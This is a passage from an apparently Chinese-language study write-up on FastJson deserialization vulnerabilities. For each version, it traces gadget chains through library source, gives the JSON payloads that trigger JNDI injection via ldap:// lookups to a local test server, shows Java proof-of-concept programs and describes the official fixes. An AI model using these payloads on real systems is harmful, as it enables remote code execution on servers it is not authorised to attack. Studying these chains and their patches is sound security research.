deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="总结-6">总结</h3>
<p>首先使用如下 <strong>Payload</strong>，将
<strong>JdbcRowSetImpl</strong> 存入
<strong>TypeUtils.mappings</strong>。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>然后按照常规 <strong>Payload</strong>打，最终
<strong>Payload</strong> 如下。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="例子-6">例子</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-5">修复</h3>
<p>官方在 <strong>1.2.48</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686">修复</a>，在
<strong>MiscCodec</strong> 处理 <strong>Class</strong> 类的地方，设置了
<strong>cache</strong> 为 <strong>false</strong>。</p>
<p><img
src="/images/Study-Unserialize-FastJson/github.com_alibaba_fastjson_commit_11b92d9f33119ca2af1a3fe6f474de5c1810e686.png" /></p>
<p>并且 <strong>loadClass</strong>
重载方法的默认的调用改为不缓存，这就避免了使用了 <strong>Class</strong>
提前将恶意类名缓存进去。</p>
<p>且黑名单新增了
<strong>1459860845934817624[java.net.InetAddress]</strong> 和
<strong>8409640769019589119[java.lang.Class]</strong>。</p>
<p><img
src="/images/Study-Unserialize-FastJson/github.com_alibaba_fastjson_commit_11b92d9f33119ca2af1a3fe6f474de5c1810e686_1.png" /></p>
<h2 id="section-6">1.2.62</h2>
<h3 id="简介-6">简介</h3>
<p><strong>FastJson &lt;= 1.2.63</strong> 均生效。</p>
<p>新的 <strong>Gadget</strong> 绕过黑名单，需要开启
<strong>AutoTypeSupport</strong>。</p>
<h3 id="分析-7">分析</h3>
<p>一个新的 <strong>Gadget</strong> 绕过黑名单，测试发现从
<strong>3.4</strong> 版本到如今的 <strong>4.23</strong> 皆可用。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="jndiconverter">JndiConverter</h4>
<p><strong>JndiConverter</strong> 的无参构造函数调用了父类
<strong>AbstractConverter</strong> 的构造方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JndiConverter (org.apache.xbean.propertyeditor)</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">JndiConverter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(Context.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>AbstractConverter</strong> 中 <strong>setAsText</strong> 跳转
<strong>toObject</strong> 到 <strong>toObjectImpl</strong>
抽象方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractConverter (org.apache.xbean.propertyeditor)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObject(text.trim());</span><br><span class="line">    <span class="built_in">super</span>.setValue(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObjectImpl(text.trim());</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">abstract</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span>;</span><br></pre></td></tr></table></figure>
<p>而 <strong>JndiConverter</strong> 中实现了这个抽象方法，调用了
<strong>context.lookup</strong>，完成 <strong>JNDI</strong> 注入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JndiConverter (org.apache.xbean.propertyeditor)</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="keyword">return</span> (Context) context.lookup(text);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="总结-7">总结</h3>
<p>新的绕过链，构造如下。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;AsText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="例子-7">例子</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;AsText\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-6">修复</h3>
<p>官方在 <strong>1.2.66</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/compare/1.2.63...1.2.66">修复</a>，加了几个
<strong>denyHashCodes</strong>，其中
<strong>0x665C53C311193973L[org.apache.xbean]</strong>。</p>
<h2 id="section-7">1.2.66</h2>
<h3 id="简介-7">简介</h3>
<p><strong>FastJson &lt;= 1.2.66</strong> 均生效。</p>
<p>新的 <strong>Gadget</strong> 绕过黑名单，需要开启
<strong>AutoTypeSupport</strong>。</p>
<h3 id="jndirealmfactory">JndiRealmFactory</h3>
<h4 id="分析-8">分析</h4>
<p>一个新的 <strong>Gadget</strong> 绕过黑名单。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.11.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>JndiRealmFactory</strong> 通过 <strong>setJndiNames</strong>
设置 <strong>jndiNames</strong>，然后 <strong>getRealms</strong>
由于符合 <strong>Getter</strong> 方法的条件会被触发，因此在
<strong>16</strong> 行处得以遍历 <strong>jndiNames</strong> 触发
<strong>JNDI</strong> 注入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JndiRealmFactory (org.apache.shiro.realm.jndi)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setJndiNames</span><span class="params">(Collection&lt;String&gt; jndiNames)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.jndiNames = jndiNames;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Collection&lt;Realm&gt; <span class="title function_">getRealms</span><span class="params">()</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line">    Collection&lt;String&gt; jndiNames = getJndiNames();</span><br><span class="line">    <span class="keyword">if</span> (jndiNames == <span class="literal">null</span> || jndiNames.isEmpty()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;One or more jndi names must be specified for the &quot;</span> +</span><br><span class="line">                getClass().getName() + <span class="string">&quot; to locate Realms.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Realm&gt; realms = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Realm&gt;(jndiNames.size());</span><br><span class="line">    <span class="keyword">for</span> (String name : jndiNames) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Realm</span> <span class="variable">realm</span> <span class="operator">=</span> (Realm) lookup(name, Realm.class);</span><br><span class="line">            realms.add(realm);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to look up realm with jndi name &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;.&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> realms.isEmpty() ? <span class="literal">null</span> : realms;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>JndiRealmFactory#getRealms</strong> 调用
<strong>JndiLocator#lookup</strong>，然后跳转
<strong>JndiTemplate#lookup</strong> 最后到
<strong>ctx.lookup</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JndiLocator (org.apache.shiro.jndi)</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">lookup</span><span class="params">(String jndiName, Class requiredType)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (jndiName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;jndiName argument must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">convertedName</span> <span class="operator">=</span> convertJndiName(jndiName);</span><br><span class="line">    Object jndiObject;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        jndiObject = getJndiTemplate().lookup(convertedName, requiredType);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NamingException ex) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!convertedName.equals(jndiName)) &#123;</span><br><span class="line">            <span class="comment">// Try fallback to originally specified name...</span></span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Converted JNDI name [&quot;</span> + convertedName +</span><br><span class="line">                        <span class="string">&quot;] not found - trying original name [&quot;</span> + jndiName + <span class="string">&quot;]. &quot;</span> + ex);</span><br><span class="line">            &#125;</span><br><span class="line">            jndiObject = getJndiTemplate().lookup(jndiName, requiredType);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    log.debug(<span class="string">&quot;Located object with JNDI name &#x27;&#123;&#125;&#x27;&quot;</span>, convertedName);</span><br><span class="line">    <span class="keyword">return</span> jndiObject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JndiTemplate (org.apache.shiro.jndi)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name, Class requiredType)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">jndiObject</span> <span class="operator">=</span> lookup(name);</span><br><span class="line">    <span class="keyword">if</span> (requiredType != <span class="literal">null</span> &amp;&amp; !requiredType.isInstance(jndiObject)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Jndi object acquired under name &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; is of type [&quot;</span> +</span><br><span class="line">                jndiObject.getClass().getName() + <span class="string">&quot;] and not assignable to the required type [&quot;</span> +</span><br><span class="line">                requiredType.getName() + <span class="string">&quot;].&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jndiObject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    log.debug(<span class="string">&quot;Looking up JNDI object with name &#x27;&#123;&#125;&#x27;&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> execute(<span class="keyword">new</span> <span class="title class_">JndiCallback</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">located</span> <span class="operator">=</span> ctx.lookup(name);</span><br><span class="line">            <span class="keyword">if</span> (located == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(</span><br><span class="line">                        <span class="string">&quot;JNDI object with [&quot;</span> + name + <span class="string">&quot;] not found: JNDI implementation returned null&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> located;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="总结-8">总结</h4>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Realms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="例子-8">例子</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;jndiNames\&quot;: [\&quot;ldap://127.0.0.1:14514/test\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;Realms\&quot;: [\&quot;\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="anterosdbcpconfig">AnterosDBCPConfig</h3>
<h4 id="metricregistry">metricRegistry</h4>
<h5 id="分析-9">分析</h5>
<p>配置如下。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>br.com.anteros<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Anteros-Core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>br.com.anteros<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Anteros-DBCP<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>一目了然的 <strong>setMetricRegistry</strong> 到
<strong>getObjectOrPerformJndiLookup</strong>，最后
<strong>initCtx.lookup</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AnterosDBCPConfig (br.com.anteros.dbcp)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMetricRegistry</span><span class="params">(Object metricRegistry)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (metricsTrackerFactory != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;cannot use setMetricRegistry() and setMetricsTrackerFactory() together&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (metricRegistry != <span class="literal">null</span>) &#123;</span><br><span class="line">     metricRegistry = getObjectOrPerformJndiLookup(metricRegistry);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!safeIsAssignableFrom(metricRegistry, <span class="string">&quot;com.codahale.metrics.MetricRegistry&quot;</span>)</span><br><span class="line">         &amp;&amp; !(safeIsAssignableFrom(metricRegistry, <span class="string">&quot;io.micrometer.core.instrument.MeterRegistry&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Class must be instance of com.codahale.metrics.MetricRegistry or io.micrometer.core.instrument.MeterRegistry&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.metricRegistry = metricRegistry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">getObjectOrPerformJndiLookup</span><span class="params">(Object object)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (object <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initCtx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="keyword">return</span> initCtx.lookup((String) object);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(e);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="总结-9">总结</h5>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="例子-9">例子</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;metricRegistry\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="healthcheckregistry">healthCheckRegistry</h4>
<h5 id="分析-10">分析</h5>
<p>和上文相似，<strong>setHealthCheckRegistry</strong> 到
<strong>getObjectOrPerformJndiLookup</strong>，最后
<strong>initCtx.lookup</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AnterosDBCPConfig (br.com.anteros.dbcp)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealthCheckRegistry</span><span class="params">(Object healthCheckRegistry)</span></span><br><span class="line">&#123;</span><br><span class="line">  checkIfSealed();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (healthCheckRegistry != <span class="literal">null</span>) &#123;</span><br><span class="line">     healthCheckRegistry = getObjectOrPerformJndiLookup(healthCheckRegistry);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!(healthCheckRegistry <span class="keyword">instanceof</span> HealthCheckRegistry)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.healthCheckRegistry = healthCheckRegistry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">getObjectOrPerformJndiLookup</span><span class="params">(Object object)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (object <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">     <span 